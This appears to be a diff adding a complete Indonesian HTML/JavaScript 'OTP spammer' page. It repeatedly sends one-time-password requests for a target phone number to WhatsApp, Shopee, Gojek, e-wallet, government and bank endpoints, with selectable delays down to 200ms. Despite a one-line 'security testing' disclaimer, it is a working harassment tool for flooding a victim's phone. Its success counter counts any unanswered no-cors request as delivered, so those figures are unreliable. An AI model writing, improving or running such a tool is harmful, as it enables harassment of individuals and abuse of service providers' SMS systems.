@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>SirLionV - OTP SPAMMER MEGA</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        body {
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
+            font-family: 'Courier New', monospace;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        .card {
+            background: rgba(0,0,0,0.85);
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 15px;
+            border: 1px solid #ff4444;
+            box-shadow: 0 0 15px rgba(255,0,0,0.3);
+        }
+        .title {
+            text-align: center;
+            font-size: 22px;
+            font-weight: bold;
+            color: #ff4444;
+            margin-bottom: 5px;
+        }
+        .sub {
+            text-align: center;
+            color: #888;
+            font-size: 10px;
+            margin-bottom: 15px;
+        }
+        input, select {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            background: #111;
+            border: 1px solid #333;
+            border-radius: 10px;
+            color: #0f0;
+            font-size: 14px;
+            font-family: monospace;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            background: linear-gradient(90deg, #ff0000, #cc0000);
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        button:active {
+            transform: scale(0.97);
+        }
+        button:disabled {
+            background: #333;
+            cursor: not-allowed;
+        }
+        .log-box {
+            background: #000;
+            border-radius: 10px;
+            padding: 10px;
+            height: 250px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 11px;
+            border: 1px solid #0f0;
+        }
+        .log-success { color: #0f0; margin: 2px 0; }
+        .log-fail { color: #f00; margin: 2px 0; }
+        .log-info { color: #ff0; margin: 2px 0; }
+        .stats {
+            display: flex;
+            justify-content: space-between;
+            margin: 10px 0;
+            padding: 8px;
+            background: #111;
+            border-radius: 10px;
+        }
+        .stat {
+            text-align: center;
+        }
+        .stat-value {
+            font-size: 20px;
+            font-weight: bold;
+            color: #ff4444;
+        }
+        .stat-label {
+            font-size: 9px;
+            color: #888;
+        }
+        .checkbox-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 10px 0;
+        }
+        .checkbox-group label {
+            color: #0f0;
+            font-size: 11px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .warning {
+            background: #331100;
+            border: 1px solid #ff6600;
+            color: #ffaa00;
+            padding: 8px;
+            border-radius: 10px;
+            font-size: 10px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        .attacking {
+            animation: pulse 1s infinite;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="card">
+        <div class="title">🔥 SIRLIONV MEGA OTP SPAMMER 🔥</div>
+        <div class="sub">WhatsApp | Kominfo | Shopee | Gojek | Tokopedia | DANA | OVO | LinkAja</div>
+        
+        <div class="warning">
+            ⚠️ UNTUK TESTING KEAMANAN SENDIRI ⚠️<br>
+            Resiko ditanggung user!
+        </div>
+        
+        <input type="tel" id="phone" placeholder="Nomor Target (628123456789)" value="">
+        
+        <div class="checkbox-group" id="serviceList">
+            <label><input type="checkbox" value="whatsapp" checked> WhatsApp</label>
+            <label><input type="checkbox" value="kominfo"> 📢 KOMINFO</label>
+            <label><input type="checkbox" value="shopee"> 🛒 Shopee</label>
+            <label><input type="checkbox" value="tokopedia"> 📦 Tokopedia</label>
+            <label><input type="checkbox" value="gojek"> 🚗 Gojek</label>
+            <label><input type="checkbox" value="dana"> 💰 DANA</label>
+            <label><input type="checkbox" value="ovo"> 🟣 OVO</label>
+            <label><input type="checkbox" value="linkaja"> 🔗 LinkAja</label>
+            <label><input type="checkbox" value="grab"> 🟢 Grab</label>
+            <label><input type="checkbox" value="bca"> 🏦 BCA</label>
+            <label><input type="checkbox" value="bri"> 🏦 BRI</label>
+            <label><input type="checkbox" value="mandiri"> 🏦 Mandiri</label>
+        </div>
+        
+        <select id="delay">
+            <option value="200">⚡ Fast (200ms)</option>
+            <option value="400" selected>⚡ Normal (400ms)</option>
+            <option value="700">🐌 Slow (700ms)</option>
+            <option value="1000">🐢 Safer (1s)</option>
+        </select>
+        
+        <div class="stats">
+            <div class="stat"><div class="stat-value" id="successCount">0</div><div class="stat-label">✅ SUCCESS</div></div>
+            <div class="stat"><div class="stat-value" id="failCount">0</div><div class="stat-label">❌ FAILED</div></div>
+            <div class="stat"><div class="stat-value" id="totalCount">0</div><div class="stat-label">📊 TOTAL</div></div>
+        </div>
+        
+        <button id="startBtn" onclick="startSpam()">🚀 START SPAM 🚀</button>
+        <button id="stopBtn" onclick="stopSpam()" disabled>⏹️ STOP SPAM ⏹️</button>
+        
+        <div class="log-box" id="logBox">
+            <div class="log-info">[!] SirLionV Mega OTP Spammer Ready</div>
+            <div class="log-info">[!] Pilih layanan & masukkan nomor target</div>
+        </div>
+    </div>
+</div>
+
+<script>
+    let isSpamming = false;
+    let spamInterval = null;
+    let success = 0;
+    let fail = 0;
+    let total = 0;
+    
+    // ============ ENDPOINT OTP ============
+    const ENDPOINTS = {
+        whatsapp: [
+            { name: "WA Web", url: "https://web.whatsapp.com/backend/send_code", body: (p) => `phone=${p}&method=sms` },
+            { name: "WA Business", url: "https://business.whatsapp.com/request_code", body: (p) => `phone_number=${p}&via=sms` },
+            { name: "WA Recovery", url: "https://recovery.whatsapp.com/request_code", body: (p) => `phone_number=${p}&method=sms` }
+        ],
+        kominfo: [
+            { name: "Kominfo API", url: "https://aduankonten.kominfo.go.id/api/otp", body: (p) => `phone=${p}` },
+            { name: "Kominfo Public", url: "https://kominfo.go.id/api/send_otp", body: (p) => `no_hp=${p}` }
+        ],
+        shopee: [
+            { name: "Shopee ID", url: "https://shopee.co.id/api/v1/account/phone/request_otp", body: (p) => `mobile=${p}` },
+            { name: "Shopee Login", url: "https://shopee.co.id/api/v1/authentication/request_otp", body: (p) => `phone=${p}` }
+        ],
+        tokopedia: [
+            { name: "Tokopedia", url: "https://accounts.tokopedia.com/api/otp/request", body: (p) => `msisdn=${p}` }
+        ],
+        gojek: [
+            { name: "Gojek", url: "https://api.gojekapi.com/v2/customers/login/request", body: (p) => `phone_number=${p}` }
+        ],
+        dana: [
+            { name: "DANA", url: "https://api.dana.id/v1/otp/request", body: (p) => `mobileNumber=${p}` }
+        ],
+        ovo: [
+            { name: "OVO", url: "https://api.ovo.id/v2/otp/request", body: (p) => `phone=${p}` }
+        ],
+        linkaja: [
+            { name: "LinkAja", url: "https://api.linkaja.com/v1/otp/send", body: (p) => `msisdn=${p}` }
+        ],
+        grab: [
+            { name: "Grab", url: "https://api.grab.com/v1/auth/otp", body: (p) => `phone_number=${p}` }
+        ],
+        bca: [
+            { name: "BCA", url: "https://api.bca.co.id/otp", body: (p) => `mobilePhone=${p}` }
+        ],
+        bri: [
+            { name: "BRI", url: "https://ib.bri.co.id/api/otp", body: (p) => `no_hp=${p}` }
+        ],
+        mandiri: [
+            { name: "Mandiri", url: "https://api.mandiri.co.id/otp/send", body: (p) => `phoneNumber=${p}` }
+        ]
+    };
+    
+    function formatPhone(phone) {
+        let cleaned = phone.replace(/[^0-9+]/g, '');
+        if (cleaned.startsWith('0')) {
+            cleaned = '62' + cleaned.substring(1);
+        }
+        if (!cleaned.startsWith('+')) {
+            cleaned = '+' + cleaned;
+        }
+        return cleaned;
+    }
+    
+    function getRawPhone(phone) {
+        return phone.replace('+', '').replace(/[^0-9]/g, '');
+    }
+    
+    function addLog(message, type = 'info') {
+        const logBox = document.getElementById('logBox');
+        const logDiv = document.createElement('div');
+        const time = new Date().toLocaleTimeString();
+        
+        if (type === 'success') {
+            logDiv.className = 'log-success';
+            logDiv.innerHTML = `[${time}] ✅ ${message}`;
+        } else if (type === 'fail') {
+            logDiv.className = 'log-fail';
+            logDiv.innerHTML = `[${time}] ❌ ${message}`;
+        } else {
+            logDiv.className = 'log-info';
+            logDiv.innerHTML = `[${time}] 📌 ${message}`;
+        }
+        
+        logBox.appendChild(logDiv);
+        logBox.scrollTop = logBox.scrollHeight;
+        
+        while (logBox.children.length > 150) {
+            logBox.removeChild(logBox.firstChild);
+        }
+    }
+    
+    function updateStats() {
+        document.getElementById('successCount').innerText = success;
+        document.getElementById('failCount').innerText = fail;
+        document.getElementById('totalCount').innerText = total;
+    }
+    
+    async function sendOTP(endpoint, phone, rawPhone) {
+        try {
+            let body;
+            if (typeof endpoint.body === 'function') {
+                body = endpoint.body(rawPhone || phone);
+            } else {
+                body = endpoint.body;
+            }
+            
+            await fetch(endpoint.url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36'
+                },
+                body: body,
+                mode: 'no-cors'
+            });
+            
+            return true;
+        } catch(e) {
+            return false;
+        }
+    }
+    
+    async function doSpam() {
+        if (!isSpamming) return;
+        
+        const phoneInput = document.getElementById('phone').value;
+        if (!phoneInput) {
+            addLog('Masukkan nomor target!', 'fail');
+            stopSpam();
+            return;
+        }
+        
+        const phone = formatPhone(phoneInput);
+        const rawPhone = getRawPhone(phone);
+        
+        // Dapetin layanan yang dipilih
+        const checkboxes = document.querySelectorAll('#serviceList input:checked');
+        const selectedServices = Array.from(checkboxes).map(cb => cb.value);
+        
+        if (selectedServices.length === 0) {
+            addLog('Pilih minimal 1 layanan!', 'fail');
+            stopSpam();
+            return;
+        }
+        
+        // Pilih random service dari yang dipilih
+        const randomService = selectedServices[Math.floor(Math.random() * selectedServices.length)];
+        const endpoints = ENDPOINTS[randomService];
+        
+        if (!endpoints || endpoints.length === 0) return;
+        
+        const randomEndpoint = endpoints[Math.floor(Math.random() * endpoints.length)];
+        
+        const result = await sendOTP(randomEndpoint, phone, rawPhone);
+        
+        if (result) {
+            success++;
+            addLog(`[${randomService.toUpperCase()}] ${randomEndpoint.name} - OTP sent to ${phone}`, 'success');
+        } else {
+            fail++;
+            addLog(`[${randomService.toUpperCase()}] ${randomEndpoint.name} - Failed`, 'fail');
+        }
+        total++;
+        updateStats();
+    }
+    
+    async function startSpam() {
+        const phone = document.getElementById('phone').value;
+        if (!phone) {
+            addLog('Isi nomor target dulu!', 'fail');
+            return;
+        }
+        
+        const selected = document.querySelectorAll('#serviceList input:checked').length;
+        if (selected === 0) {
+            addLog('Pilih minimal 1 layanan!', 'fail');
+            return;
+        }
+        
+        if (isSpamming) {
+            addLog('Spam lagi jalan, stop dulu', 'fail');
+            return;
+        }
+        
+        isSpamming = true;
+        success = 0;
+        fail = 0;
+        total = 0;
+        updateStats();
+        
+        document.getElementById('startBtn').disabled = true;
+        document.getElementById('stopBtn').disabled = false;
+        document.getElementById('startBtn').innerHTML = '🔥 SPAMMING 🔥';
+        document.getElementById('startBtn').classList.add('attacking');
+        
+        const delayMs = parseInt(document.getElementById('delay').value);
+        
+        addLog(`🚀 Memulai spam OTP ke ${formatPhone(phone)}`);
+        addLog(`⚙️ Delay: ${delayMs}ms | Layanan: ${selected} service(s)`);
+        
+        spamInterval = setInterval(async () => {
+            if (isSpamming) {
+                await doSpam();
+            }
+        }, delayMs);
+    }
+    
+    function stopSpam() {
+        if (spamInterval) {
+            clearInterval(spamInterval);
+            spamInterval = null;
+        }
+        isSpamming = false;
+        
+        document.getElementById('startBtn').disabled = false;
+        document.getElementById('stopBtn').disabled = true;
+        document.getElementById('startBtn').innerHTML = '🚀 START SPAM 🚀';
+        document.getElementById('startBtn').classList.remove('attacking');
+        
+        addLog(`⏹️ Spam dihentikan. Total: ${success} sukses, ${fail} gagal`, 'info');
+    }
+    
+    addLog('✅ Mega OTP Spammer siap!', 'success');
+    addLog('💡 Pilih layanan, masukin nomor, lalu START', 'info');
+</script>
+</body>
+</html>
